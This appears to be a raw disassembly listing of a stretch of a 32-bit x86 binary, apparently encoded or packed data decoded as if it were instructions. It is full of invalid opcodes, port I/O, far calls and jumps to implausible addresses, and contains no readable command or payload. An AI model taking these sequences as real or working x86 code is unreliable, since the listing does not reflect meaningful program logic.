  405017:	ef                   	out    %eax,(%dx)
  405018:	ed                   	in     (%dx),%eax
  405019:	a0 c5 9b 97 ed       	mov    0xed979bc5,%al
  40501e:	fc                   	cld
  40501f:	0c 68                	or     $0x68,%al
  405021:	0e                   	push   %cs
  405022:	3a 0c 6a             	cmp    (%edx,%ebp,2),%cl
  405025:	0e                   	push   %cs
  405026:	3a 0c 68             	cmp    (%eax,%ebp,2),%cl
  405029:	0c 3a                	or     $0x3a,%al
  40502b:	66 68 24 c5          	pushw  $0xc524
  40502f:	13 60 8c             	adc    -0x74(%eax),%esp
  405032:	08 4d 68             	or     %cl,0x68(%ebp)
  405035:	64 b3 e3             	fs mov $0xe3,%bl
  405038:	80 9b c7 99 97 d1 c6 	sbbb   $0xc6,-0x2e686639(%ebx)
  40503f:	99                   	cltd
  405040:	96                   	xchg   %eax,%esi
  405041:	9b                   	fwait
  405042:	d2 db                	rcr    %cl,%bl
  405044:	43                   	inc    %ebx
  405045:	64 3a 0c 68          	cmp    %fs:(%eax,%ebp,2),%cl
  405049:	e9 87 92 97 9a       	jmp    0x9ad7e2d5
  40504e:	c5 31                	lds    (%ecx),%esi
  405050:	38 9b 8f 9a 97 9a    	cmp    %bl,-0x65686571(%ebx)
  405056:	c5 99 dd 8c c5 9b    	lds    -0x643a7323(%ecx),%ebx
  40505c:	97                   	xchg   %eax,%edi
  40505d:	8c ac 4d 68 64 b3 96 	mov    %gs,-0x694c9b98(%ebp,%ecx,2)
  405064:	9f                   	lahf
  405065:	82 b3 e3 a8 9b c7 99 	xorb   $0x99,-0x3864571d(%ebx)
  40506c:	e1 a2                	loope  0x405010
  40506e:	c5 d3 80             	(bad)
  405071:	9b                   	fwait
  405072:	c7                   	(bad)
  405073:	99                   	cltd
  405074:	80 47 10 66          	addb   $0x66,0x10(%edi)
  405078:	68 9b 8f 9a 97       	push   $0x979a8f9b
  40507d:	9a c5 8e a4 4e 3a 66 	lcall  $0x663a,$0x4ea48ec5
  405084:	e9 92 a3 37 68       	jmp    0x6877f41b
  405089:	64 69 8e a8 4e 3a 66 	imul   $0x99d6e1e3,%fs:0x663a4ea8(%esi),%ecx
  405090:	e3 e1 d6 99 
  405094:	95                   	xchg   %eax,%ebp
  405095:	9b                   	fwait
  405096:	65 38 33             	cmp    %dh,%gs:(%ebx)
  405099:	ad                   	lods   %ds:(%esi),%eax
  40509a:	f9                   	stc
  40509b:	33 e1                	xor    %ecx,%esp
  40509d:	81 bb 8a 6c 65 3a 66 	cmpl   $0x42db3f66,0x3a656c8a(%ebx)
  4050a4:	3f db 42 
  4050a7:	05 78 76 b3 9e       	add    $0x9eb37678,%eax
  4050ac:	59                   	pop    %ecx
  4050ad:	9c                   	pushf
  4050ae:	b3 a1                	mov    $0xa1,%bl
  4050b0:	ae                   	scas   %es:(%edi),%al
  4050b1:	21 c5                	and    %eax,%ebp
  4050b3:	66 83 5f bb 89       	sbbw   $0xff89,-0x45(%edi)
  4050b8:	81 1d 3a 66 67 d2 7f 	sbbl   $0xc38997f,0xd267663a
  4050bf:	99 38 0c 
  4050c2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4050c3:	af                   	scas   %es:(%edi),%eax
  4050c4:	2a 64 b7 e3          	sub    -0x1d(%edi,%esi,4),%ah
  4050c8:	97                   	xchg   %eax,%edi
  4050c9:	9a c5 99 38 8c e8 4b 	lcall  $0x4be8,$0x8c3899c5
  4050d0:	68 64 50 66 00       	push   $0x665064
  4050d5:	fe                   	(bad)
  4050d6:	f3 24 68             	repz and $0x68,%al
  4050d9:	e9 bf 99 96 9b       	jmp    0x9bd6ea9d
  4050de:	c5 36                	lds    (%esi),%esi
  4050e0:	00 65 3a             	add    %ah,0x3a(%ebp)
  4050e3:	66 e8 8c 30          	callw  0x8173
  4050e7:	97                   	xchg   %eax,%edi
  4050e8:	97                   	xchg   %eax,%edi
  4050e9:	9b                   	fwait
  4050ea:	b9 a2 74 e4 7f       	mov    $0x7fe474a2,%ecx
  4050ef:	99                   	cltd
  4050f0:	69 ee 7f 99 54 61    	imul   $0x6154997f,%esi,%ebp
  4050f6:	48                   	dec    %eax
  4050f7:	d8 02                	fadds  (%edx)
  4050f9:	64 52                	fs push %edx
  4050fb:	2a a1 26 3a 0e 36    	sub    0x360e3a26(%ecx),%ah
  405101:	ad                   	lods   %ds:(%esi),%eax
  405102:	78 66                	js     0x40516a
  405104:	00 65 3a             	add    %ah,0x3a(%ebp)
  405107:	66 e8 8c dc          	callw  0x2d97
  40510b:	96                   	xchg   %eax,%esi
  40510c:	97                   	xchg   %eax,%edi
  40510d:	9b                   	fwait
  40510e:	52                   	push   %edx
  40510f:	8c a0 26 3a 0e 86    	mov    %fs,-0x79f1c5da(%eax)
  405115:	ac                   	lods   %ds:(%esi),%al
  405116:	78 66                	js     0x40517e
  405118:	00 9b f2 24 68 0c    	add    %bl,0xc6824f2(%ebx)
  40511e:	39 66 68             	cmp    %esp,0x68(%esi)
  405121:	e4 d2                	in     $0xd2,%al
  405123:	fa                   	cli
  405124:	98                   	cwtl
  405125:	9b                   	fwait
  405126:	c5 e5 ac             	(bad)
  405129:	44                   	inc    %esp
  40512a:	bb a1 61 0a 3a       	mov    $0x3a0a61a1,%ebx
  40512f:	66 37                	data16 aaa
  405131:	ad                   	lods   %ds:(%esi),%eax
  405132:	f9                   	stc
  405133:	33 e1                	xor    %ecx,%esp
  405135:	81 bb 8a f8 66 3a 66 	cmpl   $0x6d323b66,0x3a66f88a(%ebx)
  40513c:	3b 32 6d 
  40513f:	d9 5f 2b             	fstps  0x2b(%edi)
  405142:	41                   	inc    %ecx
  405143:	2b e9                	sub    %ecx,%ebp
  405145:	93                   	xchg   %eax,%ebx
  405146:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405147:	4d                   	dec    %ebp
  405148:	68 64 b9 c3 f4       	push   $0xf4c3b964
  40514d:	99                   	cltd
  40514e:	c5 99 68 ef 7f 6e    	lds    0x6e7fef68(%ecx),%ebx
  405154:	e8 5c 3b 69 fc       	call   0xfca98cb5
  405159:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40515a:	b9 86 69 ed bf       	mov    $0xbfed6986,%ecx
  40515f:	f6 95 9b c5 ed 2d    	notb   0x2dedc59b(%ebp)
  405165:	6c                   	insb   (%dx),%es:(%edi)
  405166:	b1 6a                	mov    $0x6a,%cl
  405168:	6d                   	insl   (%dx),%es:(%edi)
  405169:	65 3a 66 68          	cmp    %gs:0x68(%esi),%ah
  40516d:	ed                   	in     (%dx),%eax
  40516e:	b7 ea                	mov    $0xea,%bh
  405170:	95                   	xchg   %eax,%ebp
  405171:	9b                   	fwait
  405172:	c5 57 b3             	lds    -0x4d(%edi),%edx
  405175:	e5 cd                	in     $0xcd,%eax
  405177:	47                   	inc    %edi
  405178:	28 64 3a ef          	sub    %ah,-0x11(%edx,%edi,1)
  40517c:	ae                   	scas   %es:(%edi),%al
  40517d:	e7 fc                	out    %eax,$0xfc
  40517f:	63 3e                	arpl   %edi,(%esi)
  405181:	8c 44 4c 68          	mov    %es,0x68(%esp,%ecx,2)
  405185:	64 b1 33             	fs mov $0x33,%cl
  405188:	60                   	pusha
  405189:	e9 6e 64 6d 26       	jmp    0x26adb5fc
  40518e:	b3 f3                	mov    $0xf3,%bl
  405190:	c8 99 c5 99          	enter  $0xc599,$0x99
  405194:	3e 8c 50 4c          	mov    %ss,%ds:0x4c(%eax)
  405198:	68 64 b3 e3 14       	push   $0x14e3b364
  40519d:	99                   	cltd
  40519e:	c5 99 97 d1 9a 9b    	lds    -0x64652e69(%ecx),%ebx
  4051a4:	97                   	xchg   %eax,%edi
  4051a5:	9b                   	fwait
  4051a6:	d2 3f                	sarb   %cl,(%edi)
  4051a8:	42                   	inc    %edx
  4051a9:	64 3a ed             	fs cmp %ch,%ch
  4051ac:	3d 6c b1 eb 14       	cmp    $0x14ebb16c,%eax
  4051b1:	99                   	cltd
  4051b2:	c5 99 e5 30 30 63    	lds    0x633030e5(%ecx),%ebx
  4051b8:	e5 30                	in     $0x30,%eax
  4051ba:	38 67 2a             	cmp    %ah,0x2a(%edi)
  4051bd:	ed                   	in     (%dx),%eax
  4051be:	af                   	scas   %es:(%edi),%eax
  4051bf:	fe                   	(bad)
  4051c0:	95                   	xchg   %eax,%ebp
  4051c1:	9b                   	fwait
  4051c2:	c5 30                	lds    (%eax),%esi
  4051c4:	80 5f 10 66          	sbbb   $0x66,0x10(%edi)
  4051c8:	68 ed bf 1e 95       	push   $0x951ebfed
  4051cd:	9b                   	fwait
  4051ce:	c5 99 dd c4 c7 99    	lds    -0x66383b23(%ecx),%ebx
  4051d4:	97                   	xchg   %eax,%edi
  4051d5:	8c 10                	mov    %ss,(%eax)
  4051d7:	4c                   	dec    %esp
  4051d8:	68 64 b3 e3 1c       	push   $0x1ce3b364
  4051dd:	99                   	cltd
  4051de:	c5 99 97 d1 a2 9b    	lds    -0x645d2e69(%ecx),%ebx
  4051e4:	97                   	xchg   %eax,%edi
  4051e5:	9b                   	fwait
  4051e6:	d2 7f 42             	sarb   %cl,0x42(%edi)
  4051e9:	64 3a ed             	fs cmp %ch,%ch
  4051ec:	3d 6c b1 eb 10       	cmp    $0x10ebb16c,%eax
  4051f1:	99                   	cltd
  4051f2:	c5 99 e5 30 30 63    	lds    0x633030e5(%ecx),%ebx
  4051f8:	e3 e9                	jecxz  0x4051e3
  4051fa:	4e                   	dec    %esi
  4051fb:	9b                   	fwait
  4051fc:	97                   	xchg   %eax,%edi
  4051fd:	9b                   	fwait
  4051fe:	b7 32                	mov    $0x32,%bh
  405200:	62 65 b7             	bound  %esp,-0x49(%ebp)
  405203:	32 6a 65             	xor    0x65(%edx),%ch
  405206:	78 ef                	js     0x4051f7
  405208:	fd                   	std
  405209:	ec                   	in     (%dx),%al
  40520a:	c7                   	(bad)
  40520b:	99                   	cltd
  40520c:	97                   	xchg   %eax,%edi
  40520d:	ed                   	in     (%dx),%eax
  40520e:	c2 67 90             	ret    $0x9067
  405211:	ed                   	in     (%dx),%eax
  405212:	fd                   	std
  405213:	0e                   	push   %cs
  405214:	e4 a0                	in     $0xa0,%al
  405216:	78 66                	js     0x40527e
  405218:	80 93 12 66 68 ed bf 	adcb   $0xbf,-0x129799ee(%ebx)
  40521f:	f2 95                	repnz xchg %eax,%ebp
  405221:	9b                   	fwait
  405222:	c5 0c 78             	lds    (%eax,%edi,2),%ecx
  405225:	0e                   	push   %cs
  405226:	3a eb                	cmp    %bl,%ch
  405228:	ed                   	in     (%dx),%eax
  405229:	c0 c7 99             	rol    $0x99,%bh
  40522c:	97                   	xchg   %eax,%edi
  40522d:	34 d2                	xor    $0xd2,%al
  40522f:	53                   	push   %ebx
  405230:	44                   	inc    %esp
  405231:	64 3a ef             	fs cmp %bh,%ch
  405234:	90                   	nop
  405235:	4d                   	dec    %ebp
  405236:	c2 ef af             	ret    $0xafef
  405239:	8c b4 4e 68 64 6a 8e 	mov    %?,-0x71959b98(%esi,%ecx,2)
  405240:	04 48                	add    $0x48,%al
  405242:	3a 66 00             	cmp    0x0(%esi),%ah
  405245:	60                   	pusha
  405246:	3b 66 68             	cmp    0x68(%esi),%esp
  405249:	e9 bf d2 95 9b       	jmp    0x9bd6250d
  40524e:	c5 36                	lds    (%esi),%esi
  405250:	00 a7 f2 24 68 0c    	add    %ah,0xc6824f2(%edi)
  405256:	f2 ae                	repnz scas %es:(%edi),%al
  405258:	2a 64 52 64          	sub    0x64(%edx,%edx,2),%ah
  40525c:	68 64 ba 8e 50       	push   $0x508eba64
  405261:	94                   	xchg   %eax,%esp
  405262:	c5 99 eb a0 1e 6f    	lds    0x6f1ea0eb(%ecx),%ebx
  405268:	a8 11                	test   $0x11,%al
  40526a:	37                   	aaa
  40526b:	30 80 bb 12 66 68    	xor    %al,0x686612bb(%eax)
  405271:	55                   	push   %ebp
  405272:	fa                   	cli
  405273:	8f                   	(bad)
  405274:	30 66 3a             	xor    %ah,0x3a(%esi)
  405277:	66 80 7a c4 99       	data16 cmpb $0x99,-0x3c(%edx)
  40527c:	97                   	xchg   %eax,%edi
  40527d:	0c 3e                	or     $0x3e,%al
  40527f:	67 68 64 b7 e3 94    	addr16 push $0x94e3b764
  405285:	9a c5 99 38 e9 bf d2 	lcall  $0xd2bf,$0xe93899c5
  40528c:	95                   	xchg   %eax,%ebp
  40528d:	9b                   	fwait
  40528e:	c5 36                	lds    (%esi),%esi
  405290:	80 c3 1d             	add    $0x1d,%bl
  405293:	66 68 9b 8f          	pushw  $0x8f9b
  405297:	f2 95                	repnz xchg %eax,%ebp
  405299:	9b                   	fwait
  40529a:	c5 99 dd f4 c7 99    	lds    -0x66380b23(%ecx),%ebx
  4052a0:	97                   	xchg   %eax,%edi
  4052a1:	9b                   	fwait
  4052a2:	8f ea 95 9b          	(bad)
  4052a6:	c5 99 dd ec c7 99    	lds    -0x66381323(%ecx),%ebx
  4052ac:	97                   	xchg   %eax,%edi
  4052ad:	9b                   	fwait
  4052ae:	8f                   	(bad)
  4052af:	fe                   	(bad)
  4052b0:	95                   	xchg   %eax,%ebp
  4052b1:	9b                   	fwait
  4052b2:	c5 99 dd c4 c7 99    	lds    -0x66383b23(%ecx),%ebx
  4052b8:	97                   	xchg   %eax,%edi
  4052b9:	32 b7 e3 dc 99 c5    	xor    -0x3a66231d(%edi),%dh
  4052bf:	99                   	cltd
  4052c0:	38 8c 56 94 97 9b b9 	cmp    %cl,-0x4664686c(%esi,%edx,2)
  4052c7:	a2 48 ed bf fa       	mov    %al,0xfabfed48
  4052cc:	95                   	xchg   %eax,%ebp
  4052cd:	9b                   	fwait
  4052ce:	c5 6f a8             	lds    -0x58(%edi),%ebp
  4052d1:	11 23                	adc    %esp,(%ebx)
  4052d3:	30 80 13 12 66 68    	xor    %al,0x68661213(%eax)
  4052d9:	55                   	push   %ebp
  4052da:	fa                   	cli
  4052db:	8f                   	(bad)
  4052dc:	98                   	cwtl
  4052dd:	65 3a 66 e1          	cmp    %gs:-0x1f(%esi),%ah
  4052e1:	9c                   	pushf
  4052e2:	cd 81                	int    $0x81
  4052e4:	e1 e1                	loope  0x4052c7
  4052e6:	4a                   	dec    %edx
  4052e7:	9b                   	fwait
  4052e8:	97                   	xchg   %eax,%edi
  4052e9:	9b                   	fwait
  4052ea:	b3 a1                	mov    $0xa1,%bl
  4052ec:	00 d0                	add    %dl,%al
  4052ee:	f2 24 68             	repnz and $0x68,%al
  4052f1:	e9 bf 9a 96 9b       	jmp    0x9bd6edb5
  4052f6:	c5 36                	lds    (%esi),%esi
  4052f8:	80 af 11 66 68 e9 bf 	subb   $0xbf,-0x169799ef(%edi)
  4052ff:	d2 95 9b c5 36 e5    	rclb   %cl,-0x1ac93a65(%ebp)
  405305:	e1 c6                	loope  0x4052cd
  405307:	98                   	cwtl
  405308:	97                   	xchg   %eax,%edi
  405309:	9b                   	fwait
  40530a:	6a 8e                	push   $0xffffff8e
  40530c:	d0 4f 3a             	rorb   $1,0x3a(%edi)
  40530f:	66 80 6e ca 99       	data16 subb $0x99,-0x36(%esi)
  405314:	97                   	xchg   %eax,%edi
  405315:	ed                   	in     (%dx),%eax
  405316:	bf e2 95 9b c5       	mov    $0xc59b95e2,%edi
  40531b:	e7 af                	out    %eax,$0xaf
  40531d:	9c                   	pushf
  40531e:	45                   	inc    %ebp
  40531f:	66 68 0e 7e          	pushw  $0x7e0e
  405323:	0c 68                	or     $0x68,%al
  405325:	e9 bf de 96 9b       	jmp    0x9bd731e9
  40532a:	c5 36                	lds    (%esi),%esi
  40532c:	80 53 11 66          	adcb   $0x66,0x11(%ebx)
  405330:	68 e7 fe 7a af       	push   $0xaf7afee7
  405335:	e1 82                	loope  0x4052b9
  405337:	98                   	cwtl
  405338:	97                   	xchg   %eax,%edi
  405339:	9b                   	fwait
  40533a:	7e 66                	jle    0x4053a2
  40533c:	68 64 bb 89 c6       	push   $0xc689bb64
  405341:	18 3a                	sbb    %bh,(%edx)
  405343:	66 af                	scas   %es:(%edi),%ax
  405345:	e1 de                	loope  0x405325
  405347:	98                   	cwtl
  405348:	97                   	xchg   %eax,%edi
  405349:	9b                   	fwait
  40534a:	3b 66 68             	cmp    0x68(%esi),%esp
  40534d:	64 5c                	fs pop %esp
  40534f:	a1 ed 8c c4 99       	mov    0x99c48ced,%eax
  405354:	97                   	xchg   %eax,%edi
  405355:	64 3a e5             	fs cmp %ch,%ah
  405358:	d5 e0                	aad    $0xe0
  40535a:	c7                   	(bad)
  40535b:	99                   	cltd
  40535c:	97                   	xchg   %eax,%edi
  40535d:	64 4e                	fs dec %esi
  40535f:	7a 0e                	jp     0x40536f
  405361:	a3 bf 8e 96 9b       	mov    %eax,0x9b968ebf
  405366:	c5 67 68             	lds    0x68(%edi),%esp
  405369:	ed                   	in     (%dx),%eax
  40536a:	c2 4f 90             	ret    $0x904f
  40536d:	ed                   	in     (%dx),%eax
  40536e:	fd                   	std
  40536f:	eb ed                	jmp    0x40535e
  405371:	dc c4                	fadd   %st,%st(4)
  405373:	99                   	cltd
  405374:	97                   	xchg   %eax,%edi
  405375:	34 d2                	xor    $0xd2,%al
  405377:	4d                   	dec    %ebp
  405378:	98                   	cwtl
  405379:	9b                   	fwait
  40537a:	c5 3f                	lds    (%edi),%edi
  40537c:	e5 e1                	in     $0xe1,%eax
  40537e:	9e                   	sahf
  40537f:	9b                   	fwait
  405380:	97                   	xchg   %eax,%edi
  405381:	9b                   	fwait
  405382:	6a eb                	push   $0xffffffeb
  405384:	ed                   	in     (%dx),%eax
  405385:	dc c4                	fadd   %st,%st(4)
  405387:	99                   	cltd
  405388:	97                   	xchg   %eax,%edi
  405389:	34 50                	xor    $0x50,%al
  40538b:	66 02 64 50 46       	data16 add 0x46(%eax,%edx,2),%ah
  405390:	02 64 50 66          	add    0x66(%eax,%edx,2),%ah
  405394:	02 64 b7 e3          	add    -0x1d(%edi,%esi,4),%ah
  405398:	94                   	xchg   %eax,%esp
  405399:	9a c5 99 38 0e 3a 8e 	lcall  $0x8e3a,$0xe3899c5
  4053a0:	4c                   	dec    %esp
  4053a1:	4c                   	dec    %esp
  4053a2:	3a 66 61             	cmp    0x61(%esi),%ah
  4053a5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4053a6:	35 e2 b7 64 3a       	xor    $0x3a64b7e2,%eax
  4053ab:	66 97                	xchg   %ax,%di
  4053ad:	d1 92 9b 97 9b d2    	rcll   $1,-0x2d646865(%edx)
  4053b3:	83 4e 64 3a          	orl    $0x3a,0x64(%esi)
  4053b7:	ef                   	out    %eax,(%dx)
  4053b8:	90                   	nop
  4053b9:	65 c2 ef af          	gs ret $0xafef
  4053bd:	9b                   	fwait
  4053be:	8f                   	(bad)
  4053bf:	f2 95                	repnz xchg %eax,%ebp
  4053c1:	9b                   	fwait
  4053c2:	c5 0e                	lds    (%esi),%ecx
  4053c4:	4e                   	dec    %esi
  4053c5:	af                   	scas   %es:(%edi),%eax
  4053c6:	78 66                	js     0x40542e
  4053c8:	00 f5                	add    %dh,%ch
  4053ca:	f2 24 68             	repnz and $0x68,%al
  4053cd:	e9 bf 9a 96 9b       	jmp    0x9bd6ee91
  4053d2:	c5 36                	lds    (%esi),%esi
  4053d4:	80 af 10 66 68 e7 fe 	subb   $0xfe,-0x189799f0(%edi)
  4053db:	76 ae                	jbe    0x40538b
  4053dd:	e1 49                	loope  0x405428
  4053df:	9b                   	fwait
  4053e0:	97                   	xchg   %eax,%edi
  4053e1:	9b                   	fwait
  4053e2:	3a 8d 46 e5 fd 27    	cmp    0x27fde546(%ebp),%cl
  4053e8:	41                   	inc    %ecx
  4053e9:	64 3a eb             	fs cmp %bl,%ch
  4053ec:	ed                   	in     (%dx),%eax
  4053ed:	98                   	cwtl
  4053ee:	c4 99 97 34 52 ef    	les    -0x10adcb69(%ecx),%ebx
  4053f4:	a0 26 3a 8e 38       	mov    0x388e3a26,%al
  4053f9:	4c                   	dec    %esp
  4053fa:	3a 66 e1             	cmp    -0x1f(%esi),%ah
  4053fd:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4053fe:	33 a6 1d 7f 52 8e    	xor    -0x71ad80e3(%esi),%esp
  405404:	6b 64 3a 8e f0       	imul   $0xfffffff0,-0x72(%edx,%edi,1),%esp
  405409:	43                   	inc    %ebx
  40540a:	3a 66 e8             	cmp    -0x18(%esi),%ah
  40540d:	e1 49                	loope  0x405458
  40540f:	9b                   	fwait
  405410:	97                   	xchg   %eax,%edi
  405411:	9b                   	fwait
  405412:	3b ec                	cmp    %esp,%ebp
  405414:	ed                   	in     (%dx),%eax
  405415:	17                   	pop    %ss
  405416:	c7                   	(bad)
  405417:	99                   	cltd
  405418:	97                   	xchg   %eax,%edi
  405419:	58                   	pop    %eax
  40541a:	3f                   	aas
  40541b:	14 a0                	adc    $0xa0,%al
  40541d:	6d                   	insl   (%dx),%es:(%edi)
  40541e:	e1 12                	loope  0x405432
  405420:	33 0c 3a             	xor    (%edx,%edi,1),%ecx
  405423:	1e                   	push   %ds
  405424:	68 64 d2 1f 4f       	push   $0x4f1fd264
  405429:	64 3a e5             	fs cmp %ch,%ah
  40542c:	d5 f4                	aad    $0xf4
  40542e:	c7                   	(bad)
  40542f:	99                   	cltd
  405430:	97                   	xchg   %eax,%edi
  405431:	64 4e                	fs dec %esi
  405433:	6c                   	insb   (%dx),%es:(%edi)
  405434:	00 64 ca 66          	add    %ah,0x66(%edx,%ecx,8)
  405438:	68 8c 5c 41 68       	push   $0x68415c8c
  40543d:	64 b3 9e             	fs mov $0x9e,%bl
  405440:	59                   	pop    %ecx
  405441:	9c                   	pushf
  405442:	b3 a1                	mov    $0xa1,%bl
  405444:	00 60 3b             	add    %ah,0x3b(%eax)
  405447:	66 68 e9 bf          	pushw  $0xbfe9
  40544b:	9a 96 9b c5 36 3b 8c 	lcall  $0x8c3b,$0x36c59b96
  405452:	e4 41                	in     $0x41,%al
  405454:	68 64 50 67 00       	push   $0x675064
  405459:	1a f2                	sbb    %dl,%dh
  40545b:	24 68                	and    $0x68,%al
  40545d:	e9 bf 9a 96 9b       	jmp    0x9bd6ef21
  405462:	c5 36                	lds    (%esi),%esi
  405464:	80 b6 85 99 97 e7 fe 	xorb   $0xfe,-0x1868667b(%esi)
  40546b:	6a 55                	push   $0x55
  40546d:	9b                   	fwait
  40546e:	c5 66 68             	lds    0x68(%esi),%esp
  405471:	11 25 e5 cd f8 c7    	adc    %esp,0xc7f8cde5
  405477:	99                   	cltd
  405478:	97                   	xchg   %eax,%edi
  405479:	64 d1 70 eb          	shll   $1,%fs:-0x15(%eax)
  40547d:	c1 a6 9b 97 9b 3a ef 	shll   $0xef,0x3a9b979b(%esi)
  405484:	90                   	nop
  405485:	55                   	push   %ebp
  405486:	c2 ef af             	ret    $0xafef
  405489:	8f                   	(bad)
  40548a:	3d e5 cd f8 c7       	cmp    $0xc7f8cde5,%eax
  40548f:	99                   	cltd
  405490:	97                   	xchg   %eax,%edi
  405491:	64 b7 e3             	fs mov $0xe3,%bh
  405494:	dc 99 c5 99 38 8c    	fcompl -0x73c7663b(%ecx)
  40549a:	b0 41                	mov    $0x41,%al
  40549c:	68 64 b3 9e 59       	push   $0x599eb364
  4054a1:	9c                   	pushf
  4054a2:	b3 a1                	mov    $0xa1,%bl
  4054a4:	3e 8c 9c 40 68 64 50 	mov    %ds,%ds:0x66506468(%eax,%eax,2)
  4054ab:	66 
  4054ac:	97                   	xchg   %eax,%edi
  4054ad:	d1 9e 9b 97 9b d2    	rcrl   $1,-0x2d646865(%esi)
  4054b3:	9f                   	lahf
  4054b4:	4e                   	dec    %esi
  4054b5:	64 3a 99 dd c0 c7 99 	cmp    %fs:-0x66383f23(%ecx),%bl
  4054bc:	97                   	xchg   %eax,%edi
  4054bd:	8c e0                	mov    %fs,%eax
  4054bf:	43                   	inc    %ebx
  4054c0:	68 64 b1 e3 f4       	push   $0xf4e3b164
  4054c5:	99                   	cltd
  4054c6:	c5 99 83 62 bb a1    	lds    -0x5e449d7d(%ecx),%ebx
  4054cc:	3e 51                	ds push %ecx
  4054ce:	3a 66 37             	cmp    0x37(%esi),%ah
  4054d1:	3a 61 af             	cmp    -0x51(%ecx),%ah
  4054d4:	aa                   	stos   %al,%es:(%edi)
  4054d5:	60                   	pusha
  4054d6:	3a 33                	cmp    (%ebx),%dh
  4054d8:	e1 81                	loope  0x40545b
  4054da:	b9 8a 78 37 6c       	mov    $0x6c37788a,%ecx
  4054df:	31 e3                	xor    %esp,%ebx
  4054e1:	39 2e                	cmp    %ebp,(%esi)
  4054e3:	d9 25 0d 42 7d e9    	fldenv 0xe97d420d
  4054e9:	8b 01                	mov    (%ecx),%eax
  4054eb:	54                   	push   %esp
  4054ec:	68 64 c5 13 60       	push   $0x6013c564
  4054f1:	8c 34 41             	mov    %?,(%ecx,%eax,2)
  4054f4:	68 64 b3 a4 0e       	push   $0xea4b364
  4054f9:	ed                   	in     (%dx),%eax
  4054fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4054fb:	98                   	cwtl
  4054fc:	e1 9c                	loope  0x40549a
  4054fe:	13 9e e1 a3 c5 13    	adc    0x13c5a3e1(%esi),%ebx
  405504:	64 8c c0             	fs mov %es,%eax
  405507:	40                   	inc    %eax
  405508:	68 64 b3 a4 0e       	push   $0xea4b364
  40550d:	ed                   	in     (%dx),%eax
  40550e:	6f                   	outsl  %ds:(%esi),(%dx)
  40550f:	9a 97 11 2a 8e 84 42 	lcall  $0x4284,$0x8e2a1197
  405516:	3a 66 e1             	cmp    -0x1f(%esi),%ah
  405519:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40551a:	5c                   	pop    %esp
  40551b:	ef                   	out    %eax,(%dx)
  40551c:	3d 92 69 8e 88       	cmp    $0x888e6992,%eax
  405521:	42                   	inc    %edx
  405522:	3a 66 e1             	cmp    -0x1f(%esi),%ah
  405525:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405526:	5c                   	pop    %esp
  405527:	ef                   	out    %eax,(%dx)
  405528:	3d 90 bb 91 f6       	cmp    $0xf691bb90,%eax
  40552d:	64 3a 66 67          	cmp    %fs:0x67(%esi),%ah
  405531:	d3 7f 98             	sarl   %cl,-0x68(%edi)
  405534:	67 d3 6f 9a          	shrl   %cl,-0x66(%bx)
  405538:	69 b4 35 d1 3d 92 3b 	imul   $0x6fd367b6,0x3b923dd1(%ebp,%esi,1),%esi
  40553f:	b6 67 d3 6f 
  405543:	92                   	xchg   %eax,%edx
  405544:	e5 20                	in     $0x20,%eax
  405546:	2a 4e 38             	sub    0x38(%esi),%cl
  405549:	0e                   	push   %cs
  40554a:	3a 8e 9c 41 3a 66    	cmp    0x663a419c(%esi),%cl
  405550:	e1 a2                	loope  0x4054f4
  405552:	0b a6 eb 19 26 67    	or     0x672619eb(%esi),%esp
  405558:	67 f0 fa             	addr16 lock cli
  40555b:	ef                   	out    %eax,(%dx)
  40555c:	2d 94 b2 60 02       	sub    $0x260b294,%eax
  405561:	60                   	pusha
  405562:	b7 23                	mov    $0x23,%bh
  405564:	70 34                	jo     0x40559a
  405566:	b3 96                	mov    $0x96,%bl
  405568:	28 34 d2             	sub    %dh,(%edx,%edx,8)
  40556b:	8b 40 64             	mov    0x64(%eax),%eax
  40556e:	3a e5                	cmp    %ch,%ah
  405570:	ac                   	lods   %ds:(%esi),%al
  405571:	68 b3 9e 41 9c       	push   $0x9c419eb3
  405576:	b3 a1                	mov    $0xa1,%bl
  405578:	97                   	xchg   %eax,%edi
  405579:	11 32                	adc    %esi,(%edx)
  40557b:	ef                   	out    %eax,(%dx)
  40557c:	98                   	cwtl
  40557d:	e7 fa                	out    %eax,$0xfa
  40557f:	63 38                	arpl   %edi,(%eax)
  405581:	8c 44 42 68          	mov    %es,0x68(%edx,%eax,2)
  405585:	64 c5 13             	lds    %fs:(%ebx),%edx
  405588:	64 6b 8d 23 96 e9 7e 	imul   $0x60,%fs:0x7ee99623(%ebp),%ecx
  40558f:	60 
  405590:	6d                   	insl   (%dx),%es:(%edi)
  405591:	24 6a                	and    $0x6a,%al
  405593:	8e 04 40             	mov    (%eax,%eax,2),%es
  405596:	3a 66 97             	cmp    -0x69(%esi),%ah
  405599:	11 2a                	adc    %ebp,(%edx)
  40559b:	69 df 21 c4 eb 2c    	imul   $0x2cebc421,%edi,%ebx
  4055a1:	62 3f                	bound  %edi,(%edi)
  4055a3:	69 df 31 c6 eb 2c    	imul   $0x2cebc631,%edi,%ebx
  4055a9:	74 38                	je     0x4055e3
  4055ab:	36 80 37 1e          	xorb   $0x1e,%ss:(%edi)
  4055af:	66 68 37 35          	pushw  $0x3537
  4055b3:	d1 2d 9a b7 22 6e    	shrl   $1,0x6e22b79a
  4055b9:	61                   	popa
  4055ba:	35 d1 3d 98 3b       	xor    $0x3b983dd1,%eax
  4055bf:	b6 67                	mov    $0x67,%dh
  4055c1:	d3 6f 90             	shrl   %cl,-0x70(%edi)
  4055c4:	e5 20                	in     $0x20,%eax
  4055c6:	2a 65 38             	sub    0x38(%ebp),%ah
  4055c9:	8c 0c 42             	mov    %cs,(%edx,%eax,2)
  4055cc:	68 64 b7 23 90       	push   $0x9023b764
  4055d1:	34 50                	xor    $0x50,%al
  4055d3:	66 3e 0c 09          	data16 ds or $0x9,%al
  4055d7:	37                   	aaa
  4055d8:	28 64 50 66          	sub    %ah,0x66(%eax,%edx,2)
  4055dc:	02 64 d2 5f          	add    0x5f(%edx,%edx,8),%ah
  4055e0:	4e                   	dec    %esi
  4055e1:	64 3a ef             	fs cmp %bh,%ch
  4055e4:	ae                   	scas   %es:(%edi),%al
  4055e5:	e5 fd                	in     $0xfd,%eax
